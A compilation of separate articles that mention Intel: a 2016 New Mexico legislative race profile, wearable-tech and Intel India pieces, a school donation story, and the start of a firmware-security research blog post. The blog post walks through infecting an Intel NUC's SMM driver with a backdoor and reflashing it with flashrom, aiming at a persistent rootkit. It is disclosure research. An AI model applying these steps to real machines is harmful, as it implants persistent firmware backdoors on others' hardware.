House District 23: Republican Incumbent Paul Pacheco of Albuquerque Challenged by Corrales Democrat Daymon Ely Details Published: 23 October 2016                    Paul Pacheco, Republican                                Damon Ely, Democrat Former Sandoval County Commissioner Daymon Ely was pretty much outside the political arena while his wife, Cynthia Fry, served as N.M. Court of Appeals Judge. Since she retired in December 2015, he’s back. Ely has been campaigning over the past year to unseat the Republican holding the House District 23 seat, retired Albuquerque police officer Paul Pacheco. An attorney in private practice, Ely proudly points out his specialty is suing other lawyers. “For the past 20 years, the majority of my work has been litigating against lawyers.” After serving on the County Commission from 2000 to 2004, Ely said he was happy to get out, especially as he and Fry dealt with her serious illness, now passed. “I never thought I would do this again,” he recalled of his re-entry into political campaigning. Ely said he knew he had to run for the legislature as a change agent when he realized his son could not find work in New Mexico, a situation all too common for young professionals who must leave to pursue careers. “That’s at the core of why I’m running,” he explained. “We should be rocking and rolling, taking advantage of the state’s unique strengths. “The problem has to be the lack of good governance.” While crime is certainly a big issue for all voters, the Democrat feels Pacheco fails to see the big picture. “He focuses on crime, and that is important,” Ely said. “But as the economy has gotten worse, we will continue to experience more crime. To focus on crime is missing the big picture.” For  him, the top four issues are jobs and the economy, education, crime and  behavioral health care. He expects to make his views heard on those topics even as a new member of the legislature’s lower house. “I have a talent for stirring the pot. That’s what we  need: to stir the pot.” While he served on the Sandoval County Commission 12 years ago, Ely led negotiations with Intel when it sought a $16 billion industrial revenue bond package to expand operations at the site between Corrales and Rio Rancho. It was said to be the largest IRB deal in U.S. history, and, as an attorney on the County Commission, Ely was at the center of those negotiations which were estimated to have saved Intel $2 billion in taxes. (See Corrales Comment Vol.XXIII No. 15 September 25, 2004 “$16 Billion IRB Approved.”) “It was a good deal for Sandoval County,” Ely insists. “And contrary to what some critics say, the County did not give Intel a nickel. It brought us a lot of good paying jobs.” And although many of those jobs have since vanished due to factory automation and downsizing, Intel still employs more than 1,500 in good jobs, the candidate points out. “Compare that to the 30 to 50 jobs that are supposed to come from the recent IRB for Facebook.” Ely said he was aware of concerns about industrial chemical emissions from Intel and some residents’ health complaints. “I live right down the hill from Intel,” he pointed out, “and I know that we can’t sacrifice people’s health.” The Democrat was born in Philadelphia, but his family moved to Arizona shortly thereafter.  He was a history major when he graduated from Arizona State University in 1979. He earned a law degree there in 1982, the same year he moved to the Albuquerque area. Ely did labor law and contract work for a law firm and then set out on his own in 1989. “I’m the leading lawyer in the state who sues lawyers… which I love.” He’s convinced it is past time for a change in the way economic development is done in New Mexico. “We’re the only state in the Southwest that’s losing population. This is not a healthy economy, so we have to look at the reasons for that. The path we’ve been on for years is not working. The idea has been that we need to compete with other states; ‘let’s do tax cuts and get to the lowest common denominator, and that will attract business.’ It hasn’t worked. “So we have to start trying something new. We have to focus on our strengths and our weaknesses. Rather than compete for the lowest common denominator, where —if we got close to landing a business with good paying jobs — Texas would suddenly throw in a bunch of money and wipe us out. “Why not be the solar capital? Or the wind capital?  Or the water management experts? Or the center of trade, which is something that Republicans love to talk about so we could work across party lines.” Expanding film credits could also have a huge role, he said. He also likes the concept of developing an “inland port” in New Mexico taking advantage of Albuquerque’s international airport and the railroads. “Trade is our history and also our future.” “So the question is, where does the money come from to do that? How does government act as a catalyst? The answer is that, while we are out of money in the operating account by $600 million-plus, we have other funds, such as the $15 billion permanent fund and the capital outlay fund.” He wants to make better use of the “slush fund” for the governor and legislators and to increase transparency on how that $2.5 billion is used. “That is not a transparent fund; everybody knows it, but nobody’s doing anything about it. There’s no way to know how much of that is already committed or spent. It is all done behind closed doors. That’s a lousy way to run government and open to corruption. “My first job will be to make that transparent,” the candidate said. Ely would like to establish a stable source of revenue to fund public education, create a bipartisan commission for  legislative re-districting and legalize recreational marijuana use. “We spend lots of money locking people up for marijuana. Those same people, if they crossed the state line into Colorado, wouldn’t even be arrested.” Ely pointed out he has been endorsed by the N.M. Conservation Voters Alliance.   Paul Pacheco Republican Perhaps his signature piece of legislation over the past four years was the N.M. drivers’ license bill related to undocumented immigrants. Paul Pacheco points to his role as the political “ping-pong ball” to negotiate a bipartisan compromise that finally passed both houses of the legislature and was signed by the governor. He points to that long-running effort as proof of his ability to work across party lines. Undocumented immigrants living in New Mexico get an ID card, but not a regular driver’s license. “I am a problem solver,” he said. “I don’t just talk the talk, I’ve walked the walk. If it’s a good idea, no matter who  introduced it, I’m going to support it.” The top issues on voters’ minds are  crime, economic development and education, he said. Pacheco closed out 27 years with the Albuquerque Police Department in 2010 when he decided to run as representative for N.M. House District 23, in which he is the incumbent. But in 2010 he lost in the Republican primary to Dave Doyle.  He secured the party’s nomination for the same seat two years later, and defeated Corrales challenger Marci Blaze in the general election November 2012. When Pacheco retired from APD to run for elective office, he and his wife started a drug and alcohol rehabilitation business which they continue to operate. In his support for education, the representative has appropriated about $81,000 over four years for the Ask Academy in Rio Rancho —which led to conflict of interest charges since his brother, an architect, worked on a project for that school. “My brother was a subcontractor for remodeling at the school,” the candidate explained. “The project was handled by Rachel Matthew Homes and they hired my brother in 2012.” All of his appropriations for Ask Academy, a science, engineering and technology oriented school, were after that: $32,000 for library equipment in 2014; $24,000 for land and facilities; and $25,000 for renovations in 2016, he explained. Pacheco said he did not know about his brother’s involvement as a subcontractor until much later. “When I found out, I told everybody my brother was the architect.” The candidate said he is a ‘big proponent of working hard and doing the right things for the right reasons.” Working in the legislature was an “eye opener. Anyone who thinks they are going to go up there and change things single-handedly doesn’t understand the reality. Just on the House side, we have 70 individuals. Trying to obtain a majority of those individuals is a very, very difficult thing to accomplish, so you have to be able to work in a bipartisan manner, which sometimes is easy and sometimes it is  not.” He thinks he has a reputation for working in a bipartisan manner. “I sponsored the Assisted Outpatient Treatment bill with Democratic Senator Papen to give the mentally ill services and treatment. She asked me to co-sponsor in the House because she knew I had been a police officer and a crisis intervention officer working with mental health consumers. We got that passed in both houses and signed by the governor.” He said the bill sets up a pilot program to serve the mentally ill in Roswell and Albuquerque. “It’s the beginning of trying to get more resources diverted to the mentally ill so that our police officers will stop running into these individuals and getting into violent confrontations. I will continue to work with Senator Papen to address the problem of the mentally ill.” Closely tied to that effort are problems resulting from drug and alcohol abuse. “As you know, my wife is in recovery, so I am a big proponent of drug and alcohol treatment. I sponsored a bill with Representative Stapleton, who’s a Democrat, last session to provide money for drug and alcohol treatment in Albuquerque. That bill didn’t fare as well, but it died in  House Appropriations because of the money situation. “I work in a very bipartisan manner. I don’t care if you’re an “R” or a “D.” He hears a lot of talk about not working with Republicans or with Democrats. “That’s a very, very immature and ignorant way of looking at it. People are tired of gridlock.” As a former police officer, the candidate is also well positioned to carry crime-related bills.  He was in favor of re-instating capital punishment during the recent special session of the legislature and expects it will come up again in the next session. “We’re the only western state that doesn’t have the death penalty. The vast majority of people in New Mexico want the death penalty back for the murder of a police officer or children or a murder involving special circumstances such as kidnapping, rape or torture. “And again, it’s not that everybody would deserve that, or that everybody would be charged with it. It’s just another tool in the toolbox, and I voted for it. The bill made it out of the House but the Senate did not vote on it.” Pacheco carried the new “three strikes” bill to increase penalties for repeat offenders. “For three violent felonies, you would do life.” He asked for a study which revealed that life imprisonment would not fill all jail beds. Of the 11,600 violent crimes committed from 2000 to 2015, 550 committed a second violent offense, and of those just 59 committed a third. “What you have is a small number of extremely violent predators committing an inordinate amount of violent crime. Those are the ones we are trying to target for a  life sentence.” The “three strikes” law passed the House in the special session, but was not voted on in the Senate. The candidate thinks getting tougher on criminals will boost prospects for economic development. “We’re the third most violent state in the country. Business people thinking about relocating or starting up here are asking ‘What’s going on with your crime rate?’” Another economic development inhibition comes from excessive taxes and burdensome regulations, Pacheco feels. “We have tremendously smart people, but they cannot grow their business because of our rules and regulations. “We need to change our tax situation and our regulations so that business people are not so confused that they get discouraged.” In addition to continued work on crime-related issues and education reform, Pacheco wants to change issuance of handicapped parking licenses. Now those  licenses can only be issued to individuals,” he pointed out. “But what about the vans that serve those people?  The vans should have those permits also. I’ve been trying to fix that for the last two years.” Prev Next CREATE A LOGIN ACCOUNT Please take a moment to create account for full, free access to the website.

What began with fitness trackers, smartwatches and other tech-driven accessories, has since blossomed into wearable technology that can measure, monitor and report on our health, now, from the very fabric of our clothing. Wearable tech has been the hot topic of the year with brands like Fitbit. The fitness tracking brand pulled ahead of Apple and Samsung as the top purveyor of leading wearable devices.  Fitbit recently reported first-quarter net income of $11 million on $505.4 million in revenue. As consumers’ response to tech has varied, from the unfavorable (Google Glass) to the hopeful (VR Goggles), the question remains: How will the consumer respond to the meteoric developments in the world of wearables? “It’s this convergence of really figuring out how you integrate technology in an invisible way, yet it’s meaningful to the consumer. Every brand has a unique consumer,” Sandra Lopez, vice president of strategic relationships/business development for Intel’s New Devices Group, told The International Business Times at the 2016 Fashion Tech Forum, which was held in Brooklyn Oct. 13. Founded by CEO and consultant Karen Harvey, this was the conference’s third year and played host to innovators in the wearables space, from Sandra Lopez, Intel's vice president of wearables, to Paul Dillinger, Levi’s vice president of global product innovation.  Lopez has championed Intel’s bite-size module device, Intel’s Curie Module, and formed partnerships with fashion brands like Fila for Baja East and Hussein Chalayan to integrate the device, a mix of software and hardware, into their accessories, making virtually any piece a wearable. Lopez said the success of wearable pieces lies in how each brand harnesses the technology to make it work for consumers. And “one size” does not fit all.  “It’s personal. I firmly believe that the people who are not using their Fitbits and put it in their drawer three months later, it probably wasn’t for them to begin with. “As a technology company, there is not one solution for everybody,” Lopez added. “We’re all different. Bringing relevant experiences and multiple experiences is going to be the key to success.” In 2016, there is no shortage of brands and companies that have delivered to bring consumers those “relevant” and continued experiences. From wearable, tech-driven fabrics to mood, health and wellness trackers, here are 10 brands and products that are redefining “wearable tech” to bring consumers smart, intuitive experiences through technology.  Tech Fabrics: Garments that feature “smart” fabric will be the washable, everyday answer to the wearable tech accessory. Google and Levi’s teamed up on Project Jacquard, which was first announced in May and champions garments made from yarns that can interact directly with digital devices and smartphones.  Using integrated GPS and electronics that are washable, Wearable Experiments also debuted a line of pieces that connect wearers to experience, or “human/computer” interaction. The company released a sports jersey, aptly named the Fan Jersey, prior to the Super Bowl that transmits haptic vibrations, allowing fans to feel vibrations based on real-time plays during the game. The company also released leggings called the Nadi X. The tights are made with the same technology as the jersey, but assist the wearer in correcting form during a workout.  Module-Based Wearables: Intel’s Curie Module is an example of a device that could be incorporated into a variety of products to make them wearable. In the past year, Intel has partnered with fashion brands to integrate the module into a variety of pieces.  A collaboration with designer Hussein Chalayan during Fashion Week in September saw the debut of Curie Module-powered glasses that gather biometric data to monitor breathing, heart rate and brainwave activity. Baja East and Fila partnered for Fashion Week to debut a footwear line that also used Intel's Curie technology. The connected shoes can "track and interpret fitness data" for the wearer.  Fitness and Wellbeing Trackers: Fitness trackers have had some of the highest success rates in the wearable tech space, and when it comes to fitness, Fitbit products have consistently hit the mark. Its new Charge 2 wristband uses a PurePulse Heart Rate feature that tracks heart rate and can better track caloric burn. Stress and overall wellbeing are kept in check with Vinaya’s Zenta wearable, a pioneering piece in “emotion technology.” Zenta builds a profile of the wearer by tracking sleep, stress, emotional states and overall mood. The Zenta wristbands can be pre-ordered on the brand’s Indiegogo page and are expected to ship beginning in March.  VR Goggles And Glasses: With the advent of mainstream VR technology, consumers can expect to see many iterations of VR goggles debut soon. One of the most buzzed-about products is the Oculus Rift, which is expected to debut later this year. The goggles can plug in through USB or DVI ports and the consumer model is said to use 2160-by-1200 resolution, Warable reported. The Samsung Gear VR goggles are available now and connect to Samsung’s smartphones, making them compatible and user-friendly.  Related Stories Wearable Tech Takes On Air Pollution The Quirkiest New Wearables Pet Tech: Pets are in on the wearable action, too. Wearable devices that track and monitor pet health have claimed a space in the wearables category. Brands include Whistle, which tracks a pet’s location and daily activity, and PetPace, a “smart collar” that monitors a pet’s vital signs, activity and behavioral patterns.  “Enviro-trackers”: Devices that not only measure personal health and well-being, but monitor surroundings and the environment will be another coming wearable trend. Tzoa revealed its “enviro-tracker,” which hooks directly to garments and uses internal sensors to measure and report temperature, air quality, atmospheric pressure and UV exposure. Using the data, the device can help the wearer determine where there’s fresh air and indicate locations on a real-time environmental data map that shows where there is air pollution. Tzoa’s enviro-tracker currently is available for pre-order.    Join the Discussion Most Read Stay connected to the biggest stories unfolding in technology.

Multimedia Today's Paper Topics ePaper WealthCheck SEARCH Follow Home News Markets Companies Money & Banking Economy Info-tech Opinion Specials Portfolio Catalyst BLink Social Media Computers & Laptops Mobiles & Tablets Other Gadgets ‘We’ve shifted our focus to IoT with our skill initiatives in line with corporate strategy’ Jessu John   ·   print   ·   T+  ·   T- Tweet KISHORE BALAJI, Director – Corporate Affairs for Intel, South Asia Intel India has a range of education initiatives — from digital literacy to skilling among older youth — and over the last year has changed its focus in this area to Internet of Things. It has created more than a hundred IoT labs across universities and runs prototyping and innovation challenges. Kishore Balaji, Director, Corporate Affairs, South Asia, spoke to BusinessLine about all of this, including an example of a challenge run in collaboration with Reva University. He also explained how PPP models can fuel the change that India needs to adopt considering that all current trends suggest IoT hitting the peak by 2020. Excerpts: What has Intel’s approach been in its education initiatives for India? We have three pillars. One to do with basic digital literacy for people who can, therefore, participate in the digital revolution. The second is how do you get the teachers and students to use technology and innovate, and the third is how do students in the higher education system gain skills to innovate. Over the past fifteen years in India we’ve been working with the higher education pillar, but the essence has now changed. How has that change shaped your higher education initiatives? Fifteen years ago, we would work with top tier colleges to see how skill can be enhanced but over the past 5-6 years with the ecosystem getting vibrant, we’re now cutting across different tiers of institutions and working with them. The context too changes — five years ago, we would’ve worked in embedded technologies. Since last year, we’ve moved to the IoT space to align with our corporate strategy. What concrete milestones have you reached with your IoT focus? Early last year, we enabled more than 100 institutions to have an IoT lab. But besides giving them the infrastructure and investing in student as well as faculty development, we looked at a way we can give them a platform to get recognised. So students bring in their ideas, show their prototypes and we help them with the process of mentoring and rapid prototyping. Our engagement with Reva University, for example, is a point in time activity. The final showcase of student tech creation from our 100 IoT centres will take place in November. 50 teams get a chance to refine their prototypes and we’ll pick the top 10 next month. These students are at the undergraduate level. What’s the commercial opportunity for Intel India as you help fuel innovation at that level? Before we talk about our slice of IoT, it’s important to understand where the industry is going. We’re at the cusp of the fourth industrial revolution which will likely open the doors for cyber-physical-biological coming together of things. And this wave of growth will hit its peak around 2020 and by then it’s estimated that you’ll probably have around 3 or 3 ½ trillion connected devices which is about 20 billion today. Now that creates an opportunity for all — for Intel, for the industry, for the country, for students. While this is the first year of operating our 100 IoT centres at one scale, we would see it improving from this year going forward. Don’t we need effective PPP models to accomplish faster rate of change and innovation in India? We’re now living in an era where PPP is more successful than in the past, and we also see there’s a real desire to collaborate among both industry and government. The role of enterprises or MNCs is to spot trends, and create models, structures and proof points for the ecosystem partners to see through. With more ecosystem partners joining in, then academia or start-ups and mentor networks, change becomes systemic and systemised.

Rowland Elementary School Breakdown • Students: 433 • Mascot: Roadrunner • School colors: Blue and white • Vision: Achieving Excellence for Every Student in Every Classroom, Every Day Background on Rowland Elementary • The school was founded in 1966. • Named after W.C. Rowland, the director of pupil personnel and accountability for the Victoria school district. • Originally built on the edge of town in a pasture and called the Rowland Rabbits because of the large number of jackrabbits. • In the early 80's, the mascot was changed to the Roadrunner. • Mission: To provide rigorous and relevant instruction for the community of learners by fostering best practices while focusing on results and relationships. Former Rowland Elementary School students are paying back their alma mater with a $25,000 gift. The school was presented a check Oct. 3 for $25,000 by Best Buy Victoria and Intel during the Score with Intel Core annual event. Best Buy stores compete in the event to help improve the quality of sales interactions and build Intel advocacy in the store, according to a news release. Stores that win can donate money to local schools of their choosing. Best Buy's philanthropic goal is committed to giving youth hands-on access to the tech education and tools they need to be successful in school and in their future careers, said General Manager Richard Favata. "Best Buy is elated to provide Rowland Elementary a check for $25,000 because many of the Blue Shirts who work here attended Rowland as students, and we're excited to see what $25,000 can do to give the school tech updates for the 21st century," Favata said. Rowland Elementary principal Tammy Garza said the school plans to use the money in ways that will benefit all students and staff. "We took in staff suggestions and got a variety of responses," she said, explaining she wanted to include everyone. The school is looking to purchase an industrial-sized fan for its detached gym because it has no air conditioning. Garza also wants to hire an artist to do updates on the artwork outside the building that will feature the school's mascot, the Roadrunner. Also being considered are updates to the track and additional items that will benefit the teachers, such as iPads and electronic pencil sharpeners, she said. "We are looking to see how far this money will go," Garza said. She said the award benefits the students because the money allows the school to purchase beyond its budget. The award is a positive for the community as well because her school was selected by former students, Garza said. "What that tells me is that Rowland holds a warm place in their hearts," she said. "Getting the award was a bonus to the teachers and recognizes the hard work of Rowland."

My aimful life Another web log by Dmytro Oleksiuk aka Cr4sh Pages Главная страница About Saturday, October 22, 2016 Exploiting AMI Aptio firmware on example of Intel NUC Hi, everyone! This blog post is another usual article about firmware security of x86 compatible machines. Two previous articles were about my Lenovo ThinkPad T450s laptop. In "Exploiting SMM callout vulnerabilities in Lenovo firmware" I've shown some basic things related to exploitation and reverse engineering of its firmware on example of re-discovering already fixed 1day vulnerability. In another, "Exploring and exploiting Lenovo firmware secrets", I've shown how to achieve flash write protection bypass using any vulnerability that allows arbitrary System Management Mode code execution. Also, I released exploit for 0day vulnerability in SystemSmmRuntimeRt UEFI SMM driver called ThinkPwn. Today I’m sharing with you the story of my next x86 machine hacking — we’re going to talk about UEFI vulnerabilities, exploit mitigation features of System Management Mode and new exploit called Aptiocalypsis. Also, this time I did responsible disclosure to Intel and AMI, so, at the moment of this publication you already can patch some of vulnerable products. Lots of interesting things happened since release of ThinkPwn exploit. Firstly I supposed that vulnerable code was written by Lenovo or its Independent BIOS Vendor (IBV), but later it turned out that they've taken this totally mad driver from Intel reference code. This exact code is not available in public, but open source firmware of some Intel boards has it too. For example, SmmRuntimeManagementCallback() function from Intel Quark BSP it's exactly the same vulnerable code that I've found in firmware of my T450s. It’s also interesting that vulnerable code is quite old (it comes from EFI 1.x era) but nevertheless, it was never present in EDK2 source from public repository — its version of QuarkSocPkg was heavily modified in comparison with vulnerable one. The horrible and vulnerable by design piece of code was removed by Intel somewhere in the middle of 2014, but it seems that there were no security advisories regarding this issue. Due to this IBVs had no chance to fix this vulnerability in their relatively old code base and the bug appeared in modern computers from Lenovo, Intel, GIGABYTE, Dell, HP, Fujitsu and other OEM’s (oops!). Well, I guess at this point it’s much or less clear that currently there’s nothing to do with ThinkPad anymore, it was pwned with 0day, it has too awkward code base that follows ancient version of EFI specification and 8 series chipset that is not the freshest stuff you can get. As my next target for firmware security adventures I’ve decided to take some Skylake based machine of well-known vendor who might have a decent firmware that would be interesting to break. Because I like all kinds of small x86 compatible computers, I've put my eye on the latest generation of Intel NUC. It also looks interesting because platform vendor knows his hardware better than anyone else, so, from firmware security perspective, Intel NUC is definitely not the worst choice. My new test machine: Intel NUC. So, shortly after ThinkPwn release, I bought NUC6i3SYH model of Intel NUC and started its reverse engineering. Later it turned out that its firmware was based on Aptio V code base from AMI (meh) is not so secure: I managed to find four different arbitrary SMM code execution 0day vulnerabilities in AMI and Intel SMM drivers, much cooler than ThinkPwn. However, there was at least one interesting security feature in this Intel NUC: it uses SMM_Code_Chk_En bit that works pretty much like SMEP, but for System Management Mode. I've mentioned this security feature in my previous articles, but never met its support in firmwares of real products before. This time SMM exploitation was more tricky, but I must admit that even with SMM_Code_Chk_En modern platform firmware is much more exploit friendly than, for example, modern operating system kernel or modern web browser. Looking around and dumping SMRAM contents I decided to pwn my Intel NUC in the same way like ThinkPad T450s — discover some SMM vulnerability to bypass BIOS_CNTL flash write protection and then, having arbitrary System Management Mode code execution, check if I can do something with SPI Protected Ranges (PRx) flash write protection. As for the Intel BootGuard — it is still a relatively rare feature among mass market devices, so, I considered that most likely my NUC simple doesn’t have it. All these things altogether might allow attacker to infect platform firmware with persistent rootkit that survives operating system reinstall — that’s exactly what we want to achieve. But first things first! To check which flash write protection features are present on Intel NUC, I used CHIPSEC — platform security assessment framework from Intel that was already mentioned in my blog many times. Among others modules, CHIPSEC has module named common.bios_wp and it shows the information we need: # python chipsec_main.py -m common.bios_wp
[*] running module: chipsec.modules.common.bios_wp

[!] None of the SPI protected ranges write-protect BIOS region
 Here I got some unpleasant surprise: as you can see, CHIPSEC reports that PR0-PR4 registers have zero values which means that Intel NUC doesn't use Protected Ranges flash write protection at all. It sounds amusing: my other (even more old) machines like ThinkPad T450s and Apple MacBook Pro 10,2 use PRx in addition to BIOS_CNTL and of course I've expected to have all possible security features on the latest generation Intel machine as well. On the other side — NUC firmware was written rather by AMI than Intel, same as the firmware of my Intel DQ77KB motherboard from previous articles that also doesn’t use SPI Protected Ranges. Definitely, this weird tradition looks like a birth injury of whole AMI Aptio platform including the most recent fifth version. What does it mean from the practical side? SPI Protected Ranges is very nice security mechanism, it allows to implement flash write protection that doesn’t rely on SMM code at all (in theory at least, in real life very often it’s not true, see PRx bypass part of my previous article). On platforms where PRx flash write protection is not available — attacker can use any arbitrary SMM code execution vulnerability (like ThinkPwn) to overwrite the whole platform firmware with malicious code in relatively easy way. Thanks to this gift from Intel and AMI, we can say for sure that technically NUC is already broken, I bet there aren't any machines with AMI firmware on the market which don't have at least a single SMM vulnerability. So, everything what we need — do some reverse engineering and write some code to prove it, sounds easy. The most common way of SMM exploitation is through vulnerabilities in System Management Interrupt (SMI) handlers. Usually SMM drives of modern UEFI compatible firmwares have dozens of such handlers. For more information about UEFI SMM drivers architecture and different kinds of SMI handlers please read "System Management Mode Core Interface" part of Platform Initialization Specification and my older article "Building reliable SMM backdoor for UEFI based platforms". The most interesting kind of SMI handlers suitable for ring0 to SMM exploitation is SW SMI, such handlers can be called from running operating system by writing the handler number into the APMC I/O port 0xB2. Because every SMI handler needs to be registered manually by its driver — there’s no static SMI handlers list stored somewhere inside flash image. To get such list we have two main options: Take hardware SPI programmer and infect platform firmware with my UEFI SMM backdoor which allows dumping System Management RAM (SMRAM) from running operating system. Then we can parse it’s internal structures to extract list of currently registered SMI handlers that we’re interested in. Significant drawback of this approach — it will likely not work on the platforms which have properly integrated Intel BootGuard. However, there are lots of machines with broken and incomplete BootGuard implementation that checks only PEI volume integrity and allows modifications of DXE volume, so, you can try your luck with SMM backdoor in any case. Extract all SMM drivers from your platform firmware and perform their reverse engineering to find existing calls to the RegisterHandler() function of EFI_SMM_SW_DISPATCH2_PROTOCOL used to register SW SMI handlers. Indeed, this approach is much more time consumable so I’m trying to avoid it because it's good to keep your weekend day research as cheap as possible. Of course, we can read platform firmware (except Management Engine region) without any specialized hardware just using CHIPSEC, but writing modified firmware back to the SPI flash chip on motherboard where it resides will require some hardware programmer in any case: BIOS_CNTL flash write protection will prohibit us to flash the firmware image with broken digital signature in regular software way. One of my favorite microchips of all time is FT2232H from FTDI — its dual channel USB to serial converter that supports various protocols and configurations. It can work with UART, I2C, SPI and JTAG protocols, it also supports bit-bang mode and multi-protocol synchronous high speed engine (MPSSE) — its pretty much a real digital electronics swiss knife. There’s also a single channel version of this chip called FT232H, but as for me it’s more convenient to have dual channel one: for example, you can flash firmware to your target device over SPI and debug it via JTAG in the same time which is very convenient. Also, there are some motherboards which use more than one SPI flash chip to store platform firmware (my Intel DQ77KB motherboard uses two). To work with this neat chip you can buy official FT2232H Mini Module from FTDI or make your own board. To use FT2232H Mini Module as SPI flash programmer you have to install flashrom tool and connect target flash chip to the board like shown in this table: For physical connection between programmer and flash chip in SOIC8 package there are numerous convenient tools like microprobes or SOIC8 test clips. Also, some machines have WSON packaged flash chips which require some soldering. My Intel NUC uses Winbond W25Q64CV chip in SOIC8 package — the most popular flash chip on the market, it can be found in almost any randomly picked PC. Despite of its SOIC8 package that doesn’t really require soldering for programmer connection, I prefer to have a wires soldered to my flash chip with standard pin header on their other end. In practice it’s more convenient and solid than test clips or microprobes because you can put your motherboard with soldered wires back to the case and reconnect the programmer in several seconds. Also, I have to unbrick my test devices pretty often which is also more convenient to do with permanently soldered wires. On the picture you can see Intel NUC with FT2232H Mini Module connected to its flash chip: My setup for firmware reading and writing. After that we can read the firmware image using flashrom: # flashrom -p ft2232_spi:type=2232H,port=A -r flash_image_nuc.bin Now, when we have flashable image file with platform firmware, we can open it in UEFITool (another awesome utility that was mentioned in my articles many times) and extract some SMM driver PE image to infect it with UEFI SMM backdoor. I picked up some AMI driver called NvramSmi, but technically it doesn’t matter — you can use any SMM driver available in your firmware except, probably, SMM core itself. NUC firmware loaded into UEFITool. On the picture above you can notice that UEFITool haven’t found any Firmware Interface Table (FIT) entries responsible for BootGuard configuration (there’s only some FIT entries with microcode updates) which confirms our early made hypothesis that Intel NUC has no BootGuard support at all. Now we can say for sure — any arbitrary SMM code execution vulnerability on this platform automatically means complete pwnage of entire platform firmware. Yeah, it’s a much smaller amount of fun than I expected. UEFI SMM backdoor comes with multi-functional SmmBackdoor.py Python program, it allows to infect arbitrary SMM driver PE image with the backdoor code and communicate with this code when system was booted with infected firmware. To infect NvramSmi driver image that was extracted in previous step, use the following command where SmmBackdoor.efi is backdoor executable image compiled for proper architecture (usually it’s x86_64): $ python SmmBackdoor.py -i NvramSmi.efi -p SmmBackdoor.efi -o NvramSmi_infected.efi

New entry point RVA is 0x00002e44
New .xdata virtual size is 0x00005b80
New image size is 0x00006da0
[+] DONE
 Now we can integrate infected driver back into the flash image using UEFITool. Please note, that currently there are two UEFITool branches: so called new engine and old engine. The new engine has much more nice source code with lots of cool new features, but only the old one currently supports flash image modification, so, to deploy UEFI SMM backdoor you have to use something like old UEFITool 0.2x rather than the new 0.3x. Write infected firmware image back into the flash chip: # flashrom -p ft2232_spi:type=2232H,port=A -w flash_image_nuc.bin Now we can boot Intel NUC with modified firmware, while it boots you can see debug output of UEFI SMM backdoor on the screen which is very convenient for troubleshooting. Also, backdoor is trying to print the same debug output into the first COM port, but it seems that on Intel NUC there’s no such ports present (yeah, totally not cool, but on the other side it has LPC debug header that also might be interesting for debug purposes). Having fun with infected Intel NUC firmware. When operating system was booted (I’m using live USB stick with Gentoo Linux that has flashrom, CHIPSEC, UEFI SMM backdoor, my UEFI boot script table exploit with software DMA attack tools and other useful stuff for firmware security research) we finally can run several commands to communicate with installed backdoor. First one is used to check its presence and get some basic information about SMRAM layout. Second one is used to dump all SMRAM regions discovered on target platform into the files. localhost ~ # python SmmBackdoor.py --test

[+] DONE
 As you can see from the output, we have one SMRAM region (it’s obviously TSEG) with total size of 0x400000 bytes, now it's time to load it into the IDA Pro and check if we can make some tools to extract SMI handlers list and other useful information about SMM drivers execution environment. System Management Mode memory forensics It’s quite interesting fact that "System Management Mode Core Interface" specification and its practical implementations from EDK2 or AMI Aptio were designed with respect to physical memory forensics which is obviously useful for fault analysis during platform bring-up. The first important thing you should know about SMRAM dumps — they’re relatively friendly for analysis, almost every important structure has unique 4-byte signature which allows to locate and recognize the structure contents inside physical memory dump. For example, EFI_SMM_SYSTEM_TABLE structure location can be found with the checking for "SMST" signature: # get offset of EFI_SMM_SYSTEM_TABLE structure inside SMRAM dump contents
def get_smst_offset(data):

    ret = data.find('SMST\0\0\0\0')
    assert ret != -1

    return ret
 The second thing that makes your life much easier — lots of the structures which belong to the same type (like SMM protocols or SMI handlers structures) are joined into double-linked list using EFI_LIST_ENTRY field: typedef struct _EFI_LIST_ENTRY
{
    struct _EFI_LIST_ENTRY *ForwardLink;
    struct _EFI_LIST_ENTRY *BackLink;

} EFI_LIST_ENTRY;
 So, when you find one structure of some type, you can easily iterate over all the structures of the same type that currently presents in memory. Third, for proper analysis of SMRAM dump you need to know actual physical address of the memory where it was located. Of course, you can store this meta-information inside separate file in addition to memory dump file, but there’s a better way — you can extract this address from the dump itself. This code works well on SMRAM dumps from all Intel compatible machines that I have at my home: # get physical address of SMRAM location for given SMRAM dump contents
def get_smram_addr(data):

    # extract and truncate SMRAM pointer at fixed offset
    return unpack('Q', self.data[0x10 : 0x18])[0] & 0xff400000
 Intel ships open source reference implementation of UEFI compatible firmware called EDK2, but it's code contains mostly top level interfaces which are described in the specs. Obviously, UEFI specification has nothing to do with certain configuration features of exact hardware and it’s not even a thing that was designed specifically for IA-32 architecture or Intel chips. The part of platform firmware code (and I must admit it’s quite large part) that implements support of specific hardware is called Board Support Package (BSP) and unfortunately, BSP for "large" Intel products like chipsets (that can be found inside your laptop or desktop PC) is not available in public. Why does it matter for dumps analysis? The most interesting parts of SMM code like SMI management, SMRAM regions protection, etc. belong to the BSP, so, EDK2 code base can’t provide us complete information about internal SMM core structures. Luckily, there’s a small Intel board called Galileo based on Intel Quark SoC which implements a much or less complete subset of i586 architecture including System Management Mode. At first glance this product looks strange (x86 based Arduino, hell yeah!), but if we throw away all of the marketing bullshit around it like compatibility with Arduino IDE and shields, IoT hype and other garbage — we will clearly see that Galileo was the first Intel attempt to create cheap and relatively open hardware platform for UEFI development enthusiasts. Galileo provides you JTAG (!!!) with OpenOCD configuration files prepared by the vendor, one PCI Express Mini Card slot, one 100 Mbit Ethernet port and some GPIO pins available over Arduino shields connector. Also, it comes with open source BSP which allows you to build EDK2 based Galileo firmware from the source code, it even has a pretty robust implementation of UEFI Secure Boot! If we look into the source files of Quark BSP responsible for Quark North Cluster configuration we will figure that registered handler for any of its SMI sources like SW dispatch, Sx dispatch, periodic timer dispatch, etc. is represented by DATABASE_RECORD structure with "DBRC" signature: #define DATABASE_RECORD_SIGNATURE SIGNATURE_32 ('D', 'B', 'R', 'C')

struct _DATABASE_RECORD
{
    UINT32                          Signature;
    LIST_ENTRY                      Link;
    BOOLEAN                         Processed;

    // Status and Enable bit description
    QNC_SMM_SOURCE_DESC             SrcDesc;

    // Callback function
    EFI_SMM_HANDLER_ENTRY_POINT2    Callback;

    QNC_SMM_CONTEXT                 ChildContext;
    VOID                            *CallbackContext;
    QNC_SMM_BUFFER                  CommBuffer;
    UINTN                           BufferSize;

    // Special handling hooks -- init them to NULL if unused/unneeded
    QNC_SMM_CLEAR_SOURCE            ClearSource; // needed for SW SMI timer

    // Functions required to make callback code general
    CONTEXT_FUNCTIONS               ContextFunctions;

    // The protocol which this record dispatches
